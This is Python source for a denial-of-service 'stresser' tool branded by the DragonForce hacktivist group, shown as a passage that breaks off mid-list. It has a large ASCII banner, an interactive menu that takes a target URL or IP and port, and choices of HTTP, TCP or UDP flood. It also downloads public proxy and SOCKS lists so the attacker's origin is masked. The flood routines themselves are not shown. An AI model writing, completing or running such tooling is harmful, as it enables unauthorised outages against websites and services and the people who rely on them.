# Author: Pari Malam
# Updater: Vip3r_Li0n
# Version 4.5

import socket
import socks
import threading
import random
import re
import requests
import urllib.request
import os
import sys
from sys import stdout
import colorama
import concurrent.futures
from colorama import Fore, Style, Back, init

colorama.init(autoreset=True)

from bs4 import BeautifulSoup


if (
    sys.platform.startswith("linux")
    or sys.platform.startswith("freebsd")
    or sys.platform.startswith("debian")
    or sys.platform.startswith("redhat")
):
    from scapy.all import *
    from scapy.layers.inet import IP, TCP
    from scapy.layers.inet import UDP
elif "TERMUX_PREFIX" in os.environ:
    from kamene.all import *
    from kamene.layers.inet import IP, TCP
    from kamene.layers.inet import UDP

    print(
        f"{Fore.YELLOW} [Termusss] - This is still in experimental mode! TCP & UDP attack might not work! \
"
    )


def banners():
    stdout.write(
        "                                                                                         "
    )
    stdout.write(
        " "
        + Fore.LIGHTRED_EX
        + "\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 "
    )
    stdout.write(
        " "
        + Fore.LIGHTRED_EX
        + "\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97"
    )
    stdout.write(
        " "
        + Fore.LIGHTRED_EX
        + "\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91"
    )
    stdout.write(
        " "
        + Fore.LIGHTRED_EX
        + "\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91"
    )
    stdout.write(
        " "
        + Fore.LIGHTRED_EX
        + "\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d     \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91"
    )
    stdout.write(
        " "
        + Fore.LIGHTRED_EX
        + "\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91     \xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d"
    )
    stdout.write(
        " "
        + Fore.LIGHTRED_EX
        + "\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d      \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d "
    )
    stdout.write(
        " "
        + Fore.YELLOW
        + "\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa6\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90"
    )
    stdout.write(
        " "
        + Fore.YELLOW
        + "\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97"
    )
    stdout.write(
        " "
        + Fore.YELLOW
        + "\xe2\x95\x91 \\x1b[38;2;255;20;147m\xe2\x80\xa2 "
        + Fore.GREEN
        + "AUTHOR             "
        + Fore.RED
        + "    |"
        + Fore.LIGHTWHITE_EX
        + "   PARI MALAM & V1P3R_LI0N                       "
        + Fore.YELLOW
        + "\xe2\x95\x91"
    )
    stdout.write(
        " "
        + Fore.YELLOW
        + "\xe2\x95\x91 \\x1b[38;2;255;20;147m\xe2\x80\xa2 "
        + Fore.GREEN
        + "GITHUB             "
        + Fore.RED
        + "    |"
        + Fore.LIGHTWHITE_EX
        + "   GITHUB.COM/PARI-MALAM                         "
        + Fore.YELLOW
        + "\xe2\x95\x91"
    )
    stdout.write(
        " "
        + Fore.YELLOW
        + "\xe2\x95\x91 \\x1b[38;2;255;20;147m\xe2\x80\xa2 "
        + Fore.GREEN
        + "VERSION             "
        + Fore.RED
        + "   |"
        + Fore.LIGHTWHITE_EX
        + "   4.5                                           "
        + Fore.YELLOW
        + "\xe2\x95\x91"
    )
    stdout.write(
        " "
        + Fore.YELLOW
        + "\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d"
    )
    stdout.write(
        " "
        + Fore.YELLOW
        + "\xe2\x95\x91 \\x1b[38;2;255;20;147m\xe2\x80\xa2 "
        + Fore.GREEN
        + "OFFICIAL FORUM     "
        + Fore.RED
        + "    |"
        + Fore.LIGHTWHITE_EX
        + "   DRAGONFORCE.IO                                "
        + Fore.YELLOW
        + "\xe2\x95\x91"
    )
    stdout.write(
        " "
        + Fore.YELLOW
        + "\xe2\x95\x91 \\x1b[38;2;255;20;147m\xe2\x80\xa2 "
        + Fore.GREEN
        + "OFFICIAL TELEGRAM  "
        + Fore.RED
        + "    |"
        + Fore.LIGHTWHITE_EX
        + "   @DRAGONFORCE.IO                               "
        + Fore.YELLOW
        + "\xe2\x95\x91"
    )
    stdout.write(
        " "
        + Fore.YELLOW
        + "\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d"
    )
    print(f"{Fore.YELLOW}                 Stresser With 7-Layers DoS Attack Tools-KID")


banners()

with open("Files/user-agents.txt", "r") as f1:
    useragents = f1.read().splitlines()


import re


def inputType():
    global url, url2, ip_pattern

    try:
        if (
            not sys.platform.startswith("linux")
            or sys.platform.startswith("freebsd")
            or sys.platform.startswith("debian")
            or sys.platform.startswith("redhat")
            or "TERMUX_PREFIX" in os.environ
        ):
            print(
                f"\
{Fore.CYAN}[!!!] - {Fore.RED}Your system does not support UDP/TCP!"
            )
        url = input(
            f"\
{Fore.MAGENTA}[?] - If UDP or TCP, Enter IP Address only!\
{Fore.GREEN}[+] - Enter URL or IP Address [Without HTTP/S or WWW]\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
        ).strip()

        if url == "":
            print(
                f"{Fore.RED}\
Bro? Whutt are u doin? lmao."
            )
            inputType()

        ip_pattern = re.compile("d{1,3}\.\d{1,3}\.\\d{1,3}\.\d{1,3}")
        if ip_pattern.match(url):
            url2 = url
        else:
            url2 = (
                url.replace("http://", "")
                .replace("https://", "")
                .split("/")[0]
                .split(":")[0]
            )
        parimalamode()
    except KeyboardInterrupt:
        os._exit(0)


def parimalamode():
    global choice1
    choice1 = input(
        f"{Fore.GREEN}\
[+] Perform With 7-Layers [+]\
\
{Fore.CYAN}- HTTP Flood (Windows/Non-Root) {Fore.RED}[0]\
{Fore.CYAN}- {Fore.CYAN}TCP Flood (Root Linux) {Fore.RED}[1]\
{Fore.CYAN}- UDP Flood (Root Linux) {Fore.RED}[2]\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
    )
    if choice1 == "0":
        parimalamport()
    elif choice1 == "1":
        try:
            if (
                not sys.platform.startswith("linux")
                and os.geteuid() != 0
                or sys.platform.startswith("freebsd")
                and os.geteuid() != 0
                or sys.platform.startswith("debian")
                and os.geteuid() != 0
                or sys.platform.startswith("redhat")
                and os.geteuid() != 0
            ):
                print(
                    f"{Fore.RED}Sorry, Your system are not supported for UDP mode or run as ROOT! Try again."
                )
                parimalamode()
            else:
                parimalamport()
        except:
            pass
    elif choice1 == "2":
        try:
            if (
                not sys.platform.startswith("linux")
                and os.geteuid() != 0
                or sys.platform.startswith("freebsd")
                and os.geteuid() != 0
                or sys.platform.startswith("debian")
                and os.geteuid() != 0
                or sys.platform.startswith("redhat")
                and os.geteuid() != 0
            ):
                print(
                    f"{Fore.RED}Sorry, Your system are not supported for TCP mode or run as ROOT!! Try again."
                )
                parimalamode()
            else:
                parimalamport()
        except:
            pass
    else:
        print(f"{Fore.RED}You mistyped, try again.")
        parimalamode()


def parimalamport():
    global port, url2, url
    try:
        port = int(
            input(
                f"{Fore.CYAN}\
Choose Port to Attack - {Fore.GREEN}[1 - 20000]\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
            )
        )
        portlist = range(65535)
        if port not in [80, 443] and port in portlist:
            if ip_pattern.match(url):
                url2 = input(
                    f"\
{Fore.RED}[+] Degil! Nak UDP/TCP pakai IP!\
\
- {Fore.GREEN}Enter IP Address[Without HTTP/S OR WWW]\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
                ).strip()
            else:
                proxymode()
        else:
            if port == 80 and not ip_pattern.match(url):
                if url.startswith("http://"):
                    url2 = url
                else:
                    url2 = "http://" + url
            elif port == 443 and not ip_pattern.match(url):
                if url.startswith("https://"):
                    url2 = url
                else:
                    url2 = "https://" + url
    except ValueError:
        print(f"{Fore.RED}You mistyped, try again.")
        parimalamode()
    else:
        proxymode()


def proxymode():
    global choice2
    choice2 = input(
        f"{Fore.CYAN}\
Enable Proxy & SOCKS Method? - {Fore.GREEN}Press [Y] {Fore.GREEN}Enable {Fore.RED}[N] Disable (Not Recommended!)\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
    )
    if choice2.lower() == "y":
        choiceproxysocks()
    else:
        numthreads()


def choiceproxysocks():
    global choice3
    choice3 = input(
        f"{Fore.CYAN}\
[Choose Protocol Method] - {Fore.GREEN}[0] HTTP Protocol {Fore.MAGENTA}[1] SOCKS Protocol\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
    )
    try:
        if choice3 == "0":
            choicedownproxy()
        elif choice3 == "1":
            choicedownsocks()
    except IndexError or ValueError:
        print(f"{Fore.Red}You mistyped, try again.")
        choiceproxysocks()


def choicedownproxy():
    global out_file
    choicedp = input(
        f"{Fore.CYAN}\
[Choose] - {Fore.GREEN}[Y] Download Proxy {Fore.MAGENTA}[N] Use current proxy list\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
    )
    if choicedp.lower() == "y":
        out_file = "new_proxy"
        choicemirror1()
    elif choicedp.lower() == "n":
        out_file = "own_proxy"
        proxylist()
    else:
        print(f"{Fore.Red}You mistyped, try again.")
        choicedownproxy()


def choicedownsocks():
    global out_file
    choicesocks = input(
        f"{Fore.CYAN}\
[Choose] - {Fore.GREEN}[Y] Download Proxy {Fore.MAGENTA}[N] Use current proxy list\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
    )
    if choicesocks.lower() == "y":
        out_file = "new_proxy"
        choicemirror2()
    elif choicesocks.lower() == "n":
        out_file = "own_proxy"
        proxylist()
    else:
        print(f"{Fore.Red}You mistyped, try again.")
        choicedownsocks()


def choicemirror1():
    choicem1 = input(
        f"{Fore.CYAN}\
[Choose] - {Fore.GREEN}[1] Huge Proxy List {Fore.MAGENTA}[2] Small Proxy List\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
    )
    if choicem1 == "1":
        proxybig()
    elif choicem1 == "2":
        proxysmall()
    else:
        print(f"{Fore.Red}You mistyped, try again.")
        choicemirror1()


def choicemirror2():
    choicem2 = input(
        f"{Fore.CYAN}\
[Choose] - {Fore.GREEN}[1] Mix Proxy {Fore.MAGENTA}[2] SOCK4/5 Proxy\
\
{Fore.YELLOW}#OpsPetir@CyberTroopers:- {Fore.RED}"
    )
    if choicem2 == "1":
        proxybig()
    elif choicem2 == "2":
        proxysocks()
    else:
        print(f"{Fore.Red}You mistyped, try again.")
        choicemirror2()


def proxysocks():
    try:
        sock_api = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
            "https://www.proxy-list.download/api/v1/get?type=socks5",
            "https://www.proxyscan.io/download?type=socks5",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/andigwandi/free-proxy/main/proxy_list.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt"
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
